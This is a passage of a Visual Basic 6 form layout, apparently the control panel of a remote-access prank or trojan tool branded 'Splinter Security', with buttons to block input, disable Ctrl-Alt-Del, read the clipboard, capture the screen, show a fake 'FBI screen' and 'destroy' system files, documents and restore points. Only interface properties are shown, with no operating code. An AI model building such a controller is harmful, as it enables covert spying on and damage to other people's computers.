         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   214
         Top             =   3600
         Width           =   2895
      End
      Begin VB.Line Line5 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         X1              =   240
         X2              =   4440
         Y1              =   225
         Y2              =   225
      End
      Begin VB.Label Label33 
         BackColor       =   &H00000000&
         Caption         =   "HTTP://WWW.MAFIAPRODUCTIONS.ORG"
         BeginProperty Font 
            Name            =   "Comic Sans MS"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         MousePointer    =   2  'Cross
         TabIndex        =   213
         Top             =   4200
         Width           =   4215
      End
      Begin VB.Label Label32 
         BackColor       =   &H00000000&
         Caption         =   "HTTP://SPLINTERSECURITY.CJB.NET"
         BeginProperty Font 
            Name            =   "Comic Sans MS"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         MousePointer    =   2  'Cross
         TabIndex        =   212
         Top             =   3960
         Width           =   4335
      End
      Begin VB.Line Line4 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         X1              =   240
         X2              =   4440
         Y1              =   3480
         Y2              =   3480
      End
   End
   Begin VB.Frame Frame4 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Caption         =   "s"
      Height          =   4575
      Left            =   2400
      TabIndex        =   16
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command17 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Black Out Screen"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   30
         Top             =   2880
         Width           =   1455
      End
      Begin VB.CommandButton Command16 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Hide FBI Screen"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   29
         Top             =   2400
         Width           =   1455
      End
      Begin VB.CommandButton Command15 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Show FBI Screen"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   28
         Top             =   2400
         Width           =   1455
      End
      Begin VB.CommandButton Command14 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Show Taskbar"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   27
         Top             =   1440
         Width           =   1455
      End
      Begin VB.CommandButton Command13 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Hide Taskbar"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   26
         Top             =   1440
         Width           =   1455
      End
      Begin VB.CommandButton Command12 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Show Start Button"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   25
         Top             =   960
         Width           =   1455
      End
      Begin VB.CommandButton Command11 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Hide Start Button"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   24
         Top             =   960
         Width           =   1455
      End
      Begin VB.CommandButton Command10 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Close CD Door"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   23
         Top             =   480
         Width           =   1455
      End
      Begin VB.CommandButton Command9 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Open CD Door"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   22
         Top             =   480
         Width           =   1455
      End
      Begin VB.CommandButton Command18 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Normal Screen"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   21
         Top             =   2880
         Width           =   1455
      End
      Begin VB.CommandButton Command19 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Block Input"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   20
         Top             =   3360
         Width           =   1455
      End
      Begin VB.CommandButton Command20 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Unblock Input"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   19
         Top             =   3360
         Width           =   1455
      End
      Begin VB.CommandButton Command23 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Hide Desktop"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   18
         Top             =   1920
         Width           =   1455
      End
      Begin VB.CommandButton Command24 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Show Desktop"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   17
         Top             =   1920
         Width           =   1455
      End
      Begin VB.Label Label10 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "General Fun."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   31
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame6 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   45
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command43 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Set Cursor Position"
         Height          =   375
         Left            =   1200
         Style           =   1  'Graphical
         TabIndex        =   53
         Top             =   1920
         Width           =   1575
      End
      Begin VB.CommandButton Command42 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Show"
         Height          =   375
         Left            =   2160
         Style           =   1  'Graphical
         TabIndex        =   52
         Top             =   1440
         Width           =   1335
      End
      Begin VB.CommandButton Command41 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Hide"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   51
         Top             =   1440
         Width           =   1335
      End
      Begin VB.CommandButton Command40 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Revert Buttons"
         Height          =   375
         Left            =   2160
         Style           =   1  'Graphical
         TabIndex        =   50
         Top             =   960
         Width           =   1335
      End
      Begin VB.CommandButton Command39 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Invert Buttons"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   48
         Top             =   960
         Width           =   1335
      End
      Begin VB.CommandButton Command38 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Unfreeze"
         Height          =   375
         Left            =   2160
         Style           =   1  'Graphical
         TabIndex        =   47
         Top             =   480
         Width           =   1335
      End
      Begin VB.CommandButton Command37 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Freeze"
         Height          =   375
         Left            =   600
         Style           =   1  'Graphical
         TabIndex        =   46
         Top             =   480
         Width           =   1335
      End
      Begin VB.Label Label14 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Mouse Fun."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   49
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame7 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   54
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command53 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Flash Lights Off"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   69
         Top             =   2520
         Width           =   1815
      End
      Begin VB.CommandButton Command52 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Turn off Scroll"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   68
         Top             =   2040
         Width           =   1815
      End
      Begin VB.CommandButton Command22 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Turn off Num"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   67
         Top             =   1560
         Width           =   1815
      End
      Begin VB.CommandButton Command21 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Turn off Caps"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   66
         Top             =   1080
         Width           =   1815
      End
      Begin VB.CommandButton Command51 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Enable CTRL ALT DEL"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   63
         Top             =   3000
         Width           =   1815
      End
      Begin VB.CommandButton Command50 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Disable CTRL ALT DEL"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   62
         Top             =   3000
         Width           =   1815
      End
      Begin VB.CommandButton Command49 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Flash Lights On"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   61
         Top             =   2520
         Width           =   1815
      End
      Begin VB.CommandButton Command48 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Turn on Scroll"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   60
         Top             =   2040
         Width           =   1815
      End
      Begin VB.CommandButton Command47 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Turn on Num"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   59
         Top             =   1560
         Width           =   1815
      End
      Begin VB.CommandButton Command46 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Turn on Caps"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   57
         Top             =   1080
         Width           =   1815
      End
      Begin VB.CommandButton Command45 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Enable"
         Height          =   375
         Left            =   2280
         Style           =   1  'Graphical
         TabIndex        =   56
         Top             =   600
         Width           =   1815
      End
      Begin VB.CommandButton Command44 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Disable"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   55
         Top             =   600
         Width           =   1815
      End
      Begin VB.Label Label4 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Keyboard Fun."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   58
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame8 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   70
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.Frame BStyle 
         BorderStyle     =   0  'None
         Height          =   855
         Left            =   540
         TabIndex        =   75
         Top             =   3120
         Width           =   3495
         Begin VB.OptionButton Option5 
            Height          =   255
            Left            =   3180
            TabIndex        =   80
            Top             =   600
            Width           =   255
         End
         Begin VB.OptionButton Option4 
            Height          =   255
            Left            =   2460
            TabIndex        =   79
            Top             =   600
            Width           =   255
         End
         Begin VB.OptionButton Option3 
            Height          =   255
            Left            =   1740
            TabIndex        =   78
            Top             =   600
            Width           =   255
         End
         Begin VB.OptionButton Option2 
            Height          =   255
            Left            =   1020
            TabIndex        =   77
            Top             =   600
            Width           =   255
         End
         Begin VB.OptionButton Option1 
            Height          =   255
            Left            =   300
            TabIndex        =   76
            Top             =   600
            Value           =   -1  'True
            Width           =   255
         End
         Begin VB.Image Image5 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   510
            Left            =   2925
            Picture         =   "Form1.frx":9A9EA
            Top             =   45
            Width           =   510
         End
         Begin VB.Image Image4 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   510
            Left            =   2205
            Picture         =   "Form1.frx":9B62C
            Top             =   45
            Width           =   510
         End
         Begin VB.Image Image3 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   510
            Left            =   1485
            Picture         =   "Form1.frx":9C26E
            Top             =   45
            Width           =   510
         End
         Begin VB.Image Image2 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   510
            Left            =   765
            Picture         =   "Form1.frx":9CEB0
            Top             =   45
            Width           =   510
         End
         Begin VB.Image Image1 
            Appearance      =   0  'Flat
            BorderStyle     =   1  'Fixed Single
            Height          =   510
            Left            =   45
            Picture         =   "Form1.frx":9DAF2
            Top             =   45
            Width           =   510
         End
      End
      Begin VB.TextBox Text4 
         Height          =   2175
         Left            =   360
         MultiLine       =   -1  'True
         TabIndex        =   74
         Text            =   "Form1.frx":9E734
         Top             =   840
         Width           =   3855
      End
      Begin VB.TextBox Text3 
         Height          =   285
         Left            =   360
         TabIndex        =   73
         Text            =   "Title"
         Top             =   480
         Width           =   3855
      End
      Begin VB.CommandButton Command54 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Send"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   71
         Top             =   4080
         Width           =   1335
      End
      Begin VB.Label Label7 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Message Manager"
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1560
         TabIndex        =   72
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame12 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   101
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.TextBox Text13 
         Height          =   285
         Left            =   120
         TabIndex        =   110
         Text            =   "Splinter_X101@hotmail.com"
         Top             =   2280
         Width           =   4335
      End
      Begin VB.CommandButton Command67 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Get Homepage"
         Height          =   375
         Left            =   3120
         Style           =   1  'Graphical
         TabIndex        =   109
         Top             =   840
         Width           =   1335
      End
      Begin VB.CommandButton Command66 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Set Homepage"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   107
         Top             =   840
         Width           =   1335
      End
      Begin VB.TextBox Text12 
         Height          =   285
         Left            =   120
         ScrollBars      =   2  'Vertical
         TabIndex        =   106
         Text            =   "Home Page"
         Top             =   480
         Width           =   4335
      End
      Begin VB.TextBox Text11 
         Height          =   285
         Left            =   120
         ScrollBars      =   2  'Vertical
         TabIndex        =   105
         Text            =   "http://splintersecurity.cjb.net"
         Top             =   1440
         Width           =   4335
      End
      Begin VB.CommandButton Command65 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Open Website"
         Height          =   375
         Left            =   3120
         Style           =   1  'Graphical
         TabIndex        =   104
         Top             =   1800
         Width           =   1335
      End
      Begin VB.CommandButton Command63 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Typed URLs"
         Height          =   375
         Left            =   1560
         Style           =   1  'Graphical
         TabIndex        =   103
         Top             =   3360
         Width           =   1335
      End
      Begin VB.CommandButton Command62 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Send E-Mail"
         Height          =   375
         Left            =   3120
         Style           =   1  'Graphical
         TabIndex        =   102
         Top             =   2640
         Width           =   1335
      End
      Begin VB.Label Label16 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Internet Options."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1320
         TabIndex        =   108
         Top             =   120
         Width           =   1815
      End
   End
   Begin VB.Frame Frame11 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   92
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command61 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Unlock Clipboard"
         Height          =   375
         Left            =   1440
         Style           =   1  'Graphical
         TabIndex        =   100
         Top             =   3120
         Width           =   1335
      End
      Begin VB.CommandButton Command60 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Clear Clipboard"
         Height          =   375
         Left            =   1440
         Style           =   1  'Graphical
         TabIndex        =   99
         Top             =   4080
         Width           =   1335
      End
      Begin VB.CommandButton Command59 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Lock Clipboard"
         Height          =   375
         Left            =   1440
         Style           =   1  'Graphical
         TabIndex        =   98
         Top             =   3600
         Width           =   1335
      End
      Begin VB.CommandButton Command58 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Get Clipboard"
         Height          =   375
         Left            =   3120
         Style           =   1  'Graphical
         TabIndex        =   97
         Top             =   2880
         Width           =   1335
      End
      Begin VB.TextBox Text10 
         Height          =   855
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   96
         Text            =   "Form1.frx":9E73C
         Top             =   1920
         Width           =   4335
      End
      Begin VB.TextBox Text9 
         Height          =   855
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   95
         Text            =   "Form1.frx":9E74E
         Top             =   480
         Width           =   4335
      End
      Begin VB.CommandButton Command57 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Set Clipboard"
         Height          =   375
         Left            =   3120
         Style           =   1  'Graphical
         TabIndex        =   93
         Top             =   1440
         Width           =   1335
      End
      Begin VB.Label Label15 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Clipboard Manager."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1320
         TabIndex        =   94
         Top             =   120
         Width           =   1815
      End
   End
   Begin VB.Frame Frame10 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2520
      TabIndex        =   88
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command56 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Get"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   90
         Top             =   4200
         Width           =   1335
      End
      Begin VB.TextBox Text8 
         Height          =   3615
         Left            =   240
         MultiLine       =   -1  'True
         TabIndex        =   89
         Text            =   "Form1.frx":9E763
         Top             =   480
         Width           =   4095
      End
      Begin VB.Label Label13 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Server information."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1320
         TabIndex        =   91
         Top             =   120
         Width           =   2175
      End
   End
   Begin VB.Frame Frame17 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2520
      TabIndex        =   144
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.TextBox Text18 
         Height          =   285
         Left            =   0
         TabIndex        =   151
         Text            =   "Start Button"
         Top             =   1320
         Width           =   4335
      End
      Begin VB.CommandButton Command92 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Set Start Button"
         Height          =   375
         Left            =   1080
         Style           =   1  'Graphical
         TabIndex        =   150
         Top             =   1680
         Width           =   1935
      End
      Begin VB.CommandButton Command91 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Funny Cursor"
         Height          =   375
         Left            =   1080
         Style           =   1  'Graphical
         TabIndex        =   149
         Top             =   2640
         Width           =   1935
      End
      Begin VB.CommandButton Command90 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Scramble System Colours"
         Height          =   375
         Left            =   1080
         Style           =   1  'Graphical
         TabIndex        =   148
         Top             =   2160
         Width           =   1935
      End
      Begin VB.CommandButton Command89 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Set Computer Name"
         Height          =   375
         Left            =   1080
         Style           =   1  'Graphical
         TabIndex        =   146
         Top             =   840
         Width           =   1935
      End
      Begin VB.TextBox Text17 
         Height          =   285
         Left            =   0
         TabIndex        =   145
         Text            =   "Computer Name"
         Top             =   480
         Width           =   4335
      End
      Begin VB.Label Label21 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Extra Fun."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1320
         TabIndex        =   147
         Top             =   120
         Width           =   1815
      End
   End
   Begin VB.Frame Frame20 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   165
      Top             =   1200
      Visible         =   0   'False
      Width           =   4575
      Begin VB.CommandButton Command121 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Favorites"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   194
         Top             =   2880
         Width           =   1215
      End
      Begin VB.CommandButton Command120 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Paint"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   193
         Top             =   2400
         Width           =   1215
      End
      Begin VB.CommandButton Command119 
         BackColor       =   &H00FFFFFF&
         Caption         =   "MSN"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   192
         Top             =   1920
         Width           =   1215
      End
      Begin VB.CommandButton Command118 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Cookies"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   191
         Top             =   1440
         Width           =   1215
      End
      Begin VB.CommandButton Command117 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Rcieved Files"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   190
         Top             =   960
         Width           =   1215
      End
      Begin VB.CommandButton Command116 
         BackColor       =   &H00FFFFFF&
         Caption         =   "My Music"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   189
         Top             =   3840
         Width           =   1215
      End
      Begin VB.CommandButton Command115 
         BackColor       =   &H00FFFFFF&
         Caption         =   "My Pictures"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   188
         Top             =   3840
         Width           =   1215
      End
      Begin VB.CommandButton Command114 
         BackColor       =   &H00FFFFFF&
         Caption         =   "My Documents"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   187
         Top             =   3360
         Width           =   1215
      End
      Begin VB.CommandButton Command113 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Fonts"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   186
         Top             =   2880
         Width           =   1215
      End
      Begin VB.CommandButton Command112 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Win help"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   185
         Top             =   2400
         Width           =   1215
      End
      Begin VB.CommandButton Command111 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Cursors"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   184
         Top             =   1920
         Width           =   1215
      End
      Begin VB.CommandButton Command110 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Telnet"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   183
         Top             =   1440
         Width           =   1215
      End
      Begin VB.CommandButton Command109 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Notepad"
         Height          =   375
         Left            =   1680
         Style           =   1  'Graphical
         TabIndex        =   182
         Top             =   960
         Width           =   1215
      End
      Begin VB.CommandButton Command108 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Autoexec"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   181
         Top             =   3360
         Width           =   1215
      End
      Begin VB.CommandButton Command107 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Restore Points"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   180
         Top             =   3840
         Width           =   1215
      End
      Begin VB.CommandButton Command106 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Wordpad"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   179
         Top             =   3360
         Width           =   1215
      End
      Begin VB.CommandButton Command105 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Calculator"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   178
         Top             =   2880
         Width           =   1215
      End
      Begin VB.CommandButton Command104 
         BackColor       =   &H00FFFFFF&
         Caption         =   "System.ini"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   177
         Top             =   2400
         Width           =   1215
      End
      Begin VB.CommandButton Command103 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Win.ini"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   176
         Top             =   1920
         Width           =   1215
      End
      Begin VB.CommandButton Command102 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Command"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   175
         Top             =   1440
         Width           =   1215
      End
      Begin VB.CommandButton Command100 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Regedit"
         Height          =   375
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   173
         Top             =   960
         Width           =   1215
      End
      Begin VB.Label Label26 
         BackColor       =   &H00000000&
         Caption         =   "Destroy..."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   -1  'True
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   120
         TabIndex        =   174
         Top             =   480
         Width           =   1455
      End
      Begin VB.Label Label27 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Destruction."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1560
         TabIndex        =   166
         Top             =   120
         Width           =   1095
      End
   End
   Begin VB.Frame Frame9 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   82
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command55 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Ask Question"
         Height          =   375
         Left            =   3000
         Style           =   1  'Graphical
         TabIndex        =   87
         Top             =   2640
         Width           =   1335
      End
      Begin VB.TextBox Text7 
         Height          =   1215
         Left            =   240
         MultiLine       =   -1  'True
         TabIndex        =   86
         Text            =   "Form1.frx":9E771
         Top             =   3240
         Width           =   4095
      End
      Begin VB.TextBox Text6 
         Height          =   1695
         Left            =   240
         MultiLine       =   -1  'True
         TabIndex        =   85
         Text            =   "Form1.frx":9E77A
         Top             =   840
         Width           =   4095
      End
      Begin VB.TextBox Text5 
         Height          =   285
         Left            =   240
         TabIndex        =   84
         Text            =   "Title"
         Top             =   480
         Width           =   4095
      End
      Begin VB.Line Line1 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         X1              =   120
         X2              =   4440
         Y1              =   3120
         Y2              =   3120
      End
      Begin VB.Label Label11 
         BackColor       =   &H000000FF&
         BackStyle       =   0  'Transparent
         Caption         =   "Input Manager."
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Left            =   1680
         TabIndex        =   83
         Top             =   120
         Width           =   1575
      End
   End
   Begin VB.Frame Frame19 
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      Height          =   4575
      Left            =   2400
      TabIndex        =   167
      Top             =   1200
      Visible         =   0   'False
      Width           =   4455
      Begin VB.CommandButton Command101 
         BackColor       =   &H00FFFFFF&
         Caption         =   "Capture Screen"
         Height          =   375
         Left            =   1200
         Style           =   1  'Graphical
         TabIndex        =   170
         Top             =   1200
         Width           =   1815
      End
      Begin VB.TextBox Text20 
         Height          =   285
         Left            =   1200
         TabIndex        =   169
         Text            =   "800"
         Top             =   840
         Width           =   855
      End
      Begin VB.TextBox Text21 
         Height          =   285
         Left            =   2160
         TabIndex        =   168
         Text            =   "600"
         Top             =   840
